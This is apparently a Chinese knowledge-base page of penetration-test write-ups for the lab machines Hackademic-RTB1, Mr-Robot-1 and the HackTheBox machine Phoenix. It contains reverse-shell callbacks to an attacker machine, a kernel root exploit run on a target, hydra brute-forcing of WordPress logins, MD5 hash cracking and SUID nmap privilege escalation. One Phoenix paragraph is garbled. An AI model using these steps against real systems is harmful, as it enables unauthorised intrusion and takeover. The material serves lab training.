   Source: http://www.exploit-db.com/exploits/15285/
[+] reiserfs
   CVE-2010-1146
   Source: http://www.exploit-db.com/exploits/12130/
[+] video4linux
   CVE-2010-3081
   Source: http://www.exploit-db.com/exploits/15024/
```

一个个慢慢尝试，直到使用了rds这个exploit成功了。
[+] rds
   CVE-2010-3904
   Source: http://www.exploit-db.com/exploits/15285/

[下载地址：](http://www.exploit-db.com/exploits/15285/)

然后使用冰蝎的shell将15285.c上传到服务器目录下

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub43.jpg)

locate命令查找kali中的php的reverse shell

``` bash
root@kali:~# locate shells
/usr/share/webshells/asp
/usr/share/webshells/aspx
/usr/share/webshells/cfm
/usr/share/webshells/jsp
/usr/share/webshells/laudanum
/usr/share/webshells/perl
/usr/share/webshells/php
/usr/share/webshells/asp/cmd-asp-5.1.asp
/usr/share/webshells/asp/cmdasp.asp
/usr/share/webshells/aspx/cmdasp.aspx
/usr/share/webshells/cfm/cfexec.cfm
/usr/share/webshells/jsp/cmdjsp.jsp
/usr/share/webshells/jsp/jsp-reverse.jsp
/usr/share/webshells/perl/perl-reverse-shell.pl
/usr/share/webshells/perl/perlcmd.cgi
/usr/share/webshells/php/findsocket
/usr/share/webshells/php/php-backdoor.php
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/qsd-php-backdoor.php
/usr/share/webshells/php/simple-backdoor.php
/usr/share/webshells/php/findsocket/findsock.c
/usr/share/webshells/php/findsocket/php-findsock-shell.php
```

其中/usr/share/webshells/php/php-reverse-shell.php即为要使用的shell,leafpad打开此文件修改ip地址和端口号如下图,改成kali攻击机的ip和端口

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub44.jpg)

然后同样如上方式上传到服务器的目录下,浏览器访问该木马，同时kali攻击机上nc监听

``` bash
listening on [any] 5566 ...
192.168.84.140: inverse host lookup failed: Unknown host
connect to [192.168.84.135] from (UNKNOWN) [192.168.84.140] 51935
Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux
 02:55:19 up  4:02,  0 users,  load average: 4.99, 4.97, 4.91
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=489(apache) groups=489(apache)
sh: no job control in this shell
sh-4.0$ pwd
/
pwd
sh-4.0$ id
uid=48(apache) gid=489(apache) groups=489(apache)
id
sh-4.0$
```
成功弹回shell  ;););)

gcc编译提权脚本并执行

``` bash
sh-4.0$ ls
15285.c
php-reverse-shell.php
plugins
shell.php
themes
ls
sh-4.0$ chmod 777 *
chmod 777 *
chmod: changing permissions of `plugins': Operation not permitted
chmod: changing permissions of `themes': Operation not permitted
sh-4.0$ gcc 15285.c -o 15285
gcc 15285.c -o 15285
sh-4.0$ ./15285
./15285
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
id
uid=0(root) gid=0(root)
whoami
root
```

提权成功！就是这么屌！！！接下来读取key.txt文件找到密码，挑战完成。

``` bash
cd /root

ls
Desktop
anaconda-ks.cfg
key.txt
key.txt~

cat key.txt
Yeah!!
You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)

$_d&jgQ>>ak\#b"(Hx"o<la_%

Regards,
mr.pr0n || p0wnbox.Team || 2011
http://p0wnbox.com
```

#### eg:

还可以使用如下命令将shell变得看起来更舒服

``` bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

不好意思，这次没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

<font color="red">***The end,to be continue...***</font>
<!-- kb:end Hackademic-RTB1 -->

</details>

<a id="case-mr-robot-1"></a>

## 认证响应、去重字典与交互式程序

WordPress 登录反馈决定用户名与字典，哈希材料连接本地用户。后续保留 SUID nmap 交互模式的权限变化。

<p class="kb-provenance">来源 Mr-Robot-1 · 原记录 2020-01-02 · 24 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-mr-robot-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Mr-Robot-1 -->

#### 发布日期
名称：Mr-Robot: 1
发布日期：2016年6月28日

#### 下载

 - Download (Mirror): https://download.vulnhub.com/mrrobot/mrRobot.ova
 - Download (Torrent): https://download.vulnhub.com/mrrobot/mrRobot.ova.torrent



#### 描述

根据表演，机器人先生。
此VM在不同位置有三个key。 您的目标是找到全部三个。 每个密钥逐渐难以找到。
VM不太困难。 没有任何高级开发或逆向工程。 该级别被认为是初学者-中级。

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.0/24
Nmap scan report for 192.168.56.107
Host is up (0.00027s latency).
MAC Address: 08:00:27:8D:B7:92 (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -p- -v -sV -Pn 192.168.56.107
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

``` bash
root@kali:~# nmap -p 80,443,22 -sV -Pn -T5 -A --script=vuln 192.168.56.107
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.107
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.107:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://192.168.56.107/
|     
|     Path: http://192.168.56.107:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://192.168.56.107/
|     
|     Path: http://192.168.56.107:80/js/BASE_URL+%22/live/%22);this.firstBoot?(this.firstBoot=!1,this.track.omni("Email
|     Form id: 
|     Form action: http://192.168.56.107/
|     
|     Path: http://192.168.56.107:80/js/BASE_URL+%22/live/%22);this.firstBoot?(this.firstBoot=!1,this.track.omni("Email
|     Form id: 
|     Form action: http://192.168.56.107/
|     
|     Path: http://192.168.56.107:80/js/vendor/null,this.tags.length=0%7d,t.get=function()%7bif(0==this.tags.length)return
|     Form id: 
|     Form action: http://192.168.56.107/
|     
|     Path: http://192.168.56.107:80/js/vendor/null,this.tags.length=0%7d,t.get=function()%7bif(0==this.tags.length)return
|     Form id: 
|     Form action: http://192.168.56.107/
|     
|     Path: http://192.168.56.107:80/wp-login.php
|     Form id: loginform
|_    Form action: http://192.168.56.107/wp-login.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
|_http-passwd: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
443/tcp open   ssl/http Apache httpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.107
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: https://192.168.56.107:443/js/vendor/null,this.tags.length=0%7d,t.get=function()%7bif(0==this.tags.length)return
|     Form id: 
|     Form action: https://192.168.56.107:443/
|     
|     Path: https://192.168.56.107:443/js/vendor/null,this.tags.length=0%7d,t.get=function()%7bif(0==this.tags.length)return
|     Form id: 
|     Form action: https://192.168.56.107:443/
|     
|     Path: https://192.168.56.107:443/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: https://192.168.56.107:443/
|     
|     Path: https://192.168.56.107:443/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: https://192.168.56.107:443/
|     
|     Path: https://192.168.56.107:443/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|     Form action: https://192.168.56.107:443/
|     
|     Path: https://192.168.56.107:443/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|_    Form action: https://192.168.56.107:443/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
|_http-passwd: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_sslv2-drown:
```

dirb扫一波

``` bash
root@kali:~# dirb http://192.168.56.107/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jan  2 20:43:02 2020
URL_BASE: http://192.168.56.107/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.107/ ----
==> DIRECTORY: http://192.168.56.107/0/                                                               
==> DIRECTORY: http://192.168.56.107/admin/                                                           
+ http://192.168.56.107/atom (CODE:301|SIZE:0)                                                        
==> DIRECTORY: http://192.168.56.107/audio/                                                           
==> DIRECTORY: http://192.168.56.107/blog/                                                            
==> DIRECTORY: http://192.168.56.107/css/                                                             
+ http://192.168.56.107/dashboard (CODE:302|SIZE:0)                                                   
+ http://192.168.56.107/favicon.ico (CODE:200|SIZE:0)                                                 
==> DIRECTORY: http://192.168.56.107/feed/                                                            
==> DIRECTORY: http://192.168.56.107/image/                                                           
==> DIRECTORY: http://192.168.56.107/Image/                                                           
==> DIRECTORY: http://192.168.56.107/images/                                                          
+ http://192.168.56.107/index.html (CODE:200|SIZE:1188)                                               
+ http://192.168.56.107/index.php (CODE:301|SIZE:0)                                                   
+ http://192.168.56.107/intro (CODE:200|SIZE:516314)                                                  
==> DIRECTORY: http://192.168.56.107/js/                                                              
+ http://192.168.56.107/license (CODE:200|SIZE:309)                                                   
+ http://192.168.56.107/login (CODE:302|SIZE:0)                                                       
+ http://192.168.56.107/page1 (CODE:301|SIZE:0)                                                       
+ http://192.168.56.107/phpmyadmin (CODE:403|SIZE:94)                                                 
+ http://192.168.56.107/rdf (CODE:301|SIZE:0)                                                         
+ http://192.168.56.107/readme (CODE:200|SIZE:64)                                                     
+ http://192.168.56.107/robots (CODE:200|SIZE:41)                                                     
+ http://192.168.56.107/robots.txt (CODE:200|SIZE:41)                                                 
+ http://192.168.56.107/rss (CODE:301|SIZE:0)                                                         
+ http://192.168.56.107/rss2 (CODE:301|SIZE:0)                                                        
+ http://192.168.56.107/sitemap (CODE:200|SIZE:0)                                                     
+ http://192.168.56.107/sitemap.xml (CODE:200|SIZE:0)                                                 
==> DIRECTORY: http://192.168.56.107/video/                                                           
==> DIRECTORY: http://192.168.56.107/wp-admin/                                                        
+ http://192.168.56.107/wp-config (CODE:200|SIZE:0)                                                   
==> DIRECTORY: http://192.168.56.107/wp-content/                                                      
+ http://192.168.56.107/wp-cron (CODE:200|SIZE:0)                                                     
==> DIRECTORY: http://192.168.56.107/wp-includes/                                                     
+ http://192.168.56.107/wp-links-opml (CODE:200|SIZE:227)                                             
+ http://192.168.56.107/wp-load (CODE:200|SIZE:0)                                                     
+ http://192.168.56.107/wp-login (CODE:200|SIZE:2678)                                                 
+ http://192.168.56.107/wp-mail (CODE:500|SIZE:3064)                                                  
+ http://192.168.56.107/wp-settings (CODE:500|SIZE:0)                                                 
+ http://192.168.56.107/wp-signup (CODE:302|SIZE:0)                                                   
+ http://192.168.56.107/xmlrpc (CODE:405|SIZE:42)                                                     
+ http://192.168.56.107/xmlrpc.php (CODE:405|SIZE:42)
```
可以看到是wordpress的cms

看一看robots.txt
http://192.168.56.107/robots.txt

``` bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```

此时第一个key已经有了
http://192.168.56.107/key-1-of-3.txt

``` bash
073403c8a58a1f80d943455fb30724b9
```

然后将fsocity.dic下载下来分析

``` bash
root@kali:~# wget http://192.168.56.107/fsocity.dic
--2020-01-02 20:53:02--  http://192.168.56.107/fsocity.dic
正在连接 192.168.56.107:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：7245381 (6.9M) [text/x-c]
正在保存至: “fsocity.dic”

fsocity.dic               100%[====================================>]   6.91M  26.5MB/s  用时 0.3s    

2020-01-02 20:53:02 (26.5 MB/s) - 已保存 “fsocity.dic” [7245381/7245381])
```

``` bash
root@kali:~# file fsocity.dic 
fsocity.dic: , name offset 0x620a7574
root@kali:~# wc -l fsocity.dic 
858160 fsocity.dic
root@kali:~# head fsocity.dic 
true
false
wikia
from
the
now
Wikia
extensions
scss
window
```

这看起来像一个自定义单词列表，其中包含800k +个单词。但是，似乎有很多重复了：

``` bash
root@kali:~# sort fsocity.dic | uniq | wc -l
11451
```

将fsocity.dic去重

``` bash
root@kali:~# sort fsocity.dic | uniq > fsocityrm.dic
root@kali:~# wc -l fsocityrm.dic
11451 fsocityrm.dic
```

可以看到去重之后的字典只有11451条了，显然在这里安装了wordpress。 如果浏览到/readme.html，可以看到使用的WordPress版本为4.3.9。要做的下一件事是在计算机上运行WpScan。 它揭示了几个过时的模块，但没有设法利用。
因此，决定专注于管理面板，并尝试强行爆破管理员账号密码。 第一步是找到有效的用户名。 不幸的是，该网站似乎没有任何帖子，因此没有作者信息出现。 WpScan也无法枚举用户。
幸运的是，有一个非常方便的工具叫做Hydra，它可以暴力破解几乎所有东西，包括HTTP格式的用户名。 这是尝试登录/wp-login.php时发出的POST请求

``` bash
POST /wp-login.php HTTP/1.1
Host: 192.168.56.107
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: http://192.168.56.107
Connection: close
Referer: http://192.168.56.107/wp-login.php?redirect_to=http%3A%2F%2F192.168.56.107%2Fwp-admin%2F&reauth=1
Cookie: s_fid=6F117A4BEDFCBCE8-0646B35B635BEF6C; s_nr=1577958190705; s_cc=true; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=user&pwd=pass&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.107%2Fwp-admin%2F&testcookie=1
```

使用hydra爆破，第一步，尝试找到用户名

``` bash
root@kali:~# hydra -L fsocityrm.dic -p wedontcare 192.168.56.107 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

[80][http-post-form] host: 192.168.56.107   login: elliot   password: wedontcare
[80][http-post-form] host: 192.168.56.107   login: Elliot   password: wedontcare
[80][http-post-form] host: 192.168.56.107   login: ELLIOT   password: wedontcare
```
 - 得到用户名是elliot，不区分大小写。

<font color="red">分解下各个参数的含义</font>

 - -vV : 输出详情
 - -L fsocityrm.dic : 尝试fsocityrm.dic中的所有用户名
 - -p wedontcare : 使用唯一的密码没关系（我们现在只对用户名感兴趣）
 - 192.168.56.107 : wordpress的ip地址
 - http-post-form : 要尝试的暴力手段，这里是HTTP POST表单
 - ‘/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username’
   /wp-login.php : 表单所在的路径
   log=^USER^&pwd=^PASS^&wp-submit=Log+In : 要发送的POST参数。^USER^和^PASS^是占位符，将被替换为实际值。
   F=Invalid username : 如果响应包含文本无效的用户名，则将尝试视为失败（F）

得到用户名之后用hydra爆破密码

``` bash
root@kali:~# hydra -l elliot -P fsocityrm.dic 192.168.56.107 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect." -t 64

[80][http-post-form] host: 192.168.56.107   login: elliot   password: ER28-0652
```

 - 得到密码：ER28-0652

#### getshell

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub126.jpg)

将图片中的内容替换成冰蝎马，然后连接

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub127.jpg)

上传php-reverse-shell，然后kali端监听

``` bash
http://192.168.56.107/wp-content/themes/twentyfifteen/phpreverseshell.php
```

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
192.168.56.107: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.107] 52294
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 11:43:48 up  2:18,  0 users,  load average: 0.00, 0.15, 0.42
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
$ whoami
daemon
$ python -c 'import pty; pty.spawn("/bin/sh")'
$
```

成功弹回shell

找到第二个key，但是权限不足

``` bash
$ cd home
cd home
$ ls
ls
robot
$ cd robot
cd robot
$ ls
ls
key-2-of-3.txt  password.raw-md5
$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```

接着看看password.raw-md5有什么

``` bash
$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

显然，它看起来像是未加盐的MD5哈希密码，使用HashCat进行破解应该很容易。

``` bash
$ ./hashcat64.exe -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b D:/wordlists/rockyou.txt
hashcat (v5.1.0) starting...

* Device #1: Intel's OpenCL runtime (GPU only) is currently broken.
             We are waiting for updated OpenCL drivers from Intel.
             You can use --force to override, but do not report related errors.
* Device #3: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlInit(): Unknown Error

OpenCL Platform #1: Intel(R) Corporation
========================================
* Device #1: Intel(R) UHD Graphics 630, skipped.
* Device #2: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.

OpenCL Platform #2: NVIDIA Corporation
======================================
* Device #3: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger set to 90c

Dictionary cache built:
* Filename..: D:/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Fri Jan 03 11:57:09 2020 (0 secs)
Time.Estimated...: Fri Jan 03 11:57:09 2020 (0 secs)
Guess.Base.......: File (D:/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#3.........: 54880.6 kH/s (2.68ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 1048576/14344385 (7.31%)
Rejected.........: 0/1048576 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#3...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#3....: 123456 -> Leslee
Hardware.Mon.#3..: N/A

Started: Fri Jan 03 11:57:03 2020
Stopped: Fri Jan 03 11:57:11 2020
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub128.jpg)

由于电脑的GPU配置超屌，所以密码一秒钟就出来了，是abcdefghijklmnopqrstuvwxyz

``` bash
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

直接登录

``` bash
$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:~$ whoami
whoami
robot
```

读取第二个key，帅呆了。。。

``` bash
robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

#### 提权

在MySQL数据库中没什么有趣的。 还有一个名为mich05654的WordPress用户，其密码为Dylan_2791，但似乎毫无用处。
经过一段时间的系统探索，发现了一个有趣的二进制文件，其SUID为：

``` bash
find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

是的，是NMap本身！ 确切地说，它是旧版本（3.81）。 有趣的是，可执行文件由root拥有。 由于其SUID位置1，因此如果设法让nmap运行命令，则nmap理论上可以以root用户身份执行命令。
看一下nmap –help的输出，可以告诉我们nmap具有–interactive选项，可以产生某种REPL。

``` bash
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# whoami
whoami
root
```

成功使用nmap提权，找到第3个key，挑战完成。。。

``` bash
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# ls -la
ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
# cat firstboot_done
cat firstboot_done
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end Mr-Robot-1 -->

</details>

<a id="case-phoenix"></a>

## 插件盲注与双因素验证材料

两个 WordPress 插件分别提供查询与写入能力，OTP 材料和 rsync 任务影响本地身份。原文保留直接改插件未能继续推进的观察。

<p class="kb-provenance">来源 phoenix · 原记录 2022-03-24 · 23 个代码块 · 11 处图片引用</p>

<details class="kb-evidence" id="record-phoenix">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start phoenix -->

#### introduce

OS: Linux
Difficulty: Hard
Points:	40
Release:	05 Mar 2022
IP:	10.10.11.149

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2183.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### Enumeration
#### NMAP

``` bash
┌──(root💀kali)-[~/hackthebox/machine/phoenix]
└─# nmap -sV -v -p- --min-rate=10000 10.10.11.149
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have a couple http ports, let’s start with them:

We’re given the domain phoenix.htb so we add it to /etc/hosts. We can register and login to an account:

After singing in, we’re taken to a wordpress panel:

We see pie register however no luck with exploiting it. We can bruteforce directories and find there’s a WAF too:

We also have a site administrator that we find over at /forum:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2184.jpg)

Looking further into this /forum directory, we find it’s ran by Asgaros Forum, the current install is vulnerable to SQLi:d find cron.sh.xLooking further into this /forum directory, we find it’s ran by Asgaros Forum, the current install is vulnerable to SQLi:

``` bash
wpscan --url https://phoenix.htb/ --disable-tls-checks –enumerate u

Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: https://phoenix.htb/wp-sitemap.xml

[+] robots.txt found: https://phoenix.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.9 identified (Insecure, released on 2022-01-25).
 | Found By: Rss Generator (Passive Detection)
 |  - https://phoenix.htb/feed/, <generator>https://wordpress.org/?v=5.9</generator>
 |  - https://phoenix.htb/comments/feed/, <generator>https://wordpress.org/?v=5.9</generator>

[+] WordPress theme in use: coming-soon-event
 | Location: https://phoenix.htb/wp-content/themes/coming-soon-event/
 | Latest Version: 1.0.8 (up to date)
 | Last Updated: 2021-08-24T00:00:00.000Z
 | Readme: https://phoenix.htb/wp-content/themes/coming-soon-event/readme.txt
 | Style URL: https://phoenix.htb/wp-content/themes/coming-soon-event/style.css?ver=1.0.0
 | Style Name: Coming Soon Event
 | Description: The Coming Soon Event under construction theme will play a big role in boosting up the business and ...
 | Author: blogwp
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://phoenix.htb/wp-content/themes/coming-soon-event/style.css?ver=1.0.0, Match: 'Version: 1.0.8'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] accordion-slider-gallery
 | Location: https://phoenix.htb/wp-content/plugins/accordion-slider-gallery/
 | Latest Version: 2.2
 | Last Updated: 2022-02-23T06:48:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] asgaros-forum
 | Location: https://phoenix.htb/wp-content/plugins/asgaros-forum/
 | Last Updated: 2022-01-30T12:54:00.000Z
 | [!] The version is out of date, the latest version is 2.0.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.15.12 (10% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - https://phoenix.htb/wp-content/plugins/asgaros-forum/skin/widgets.css?ver=1.15.12

[+] photo-gallery-builder
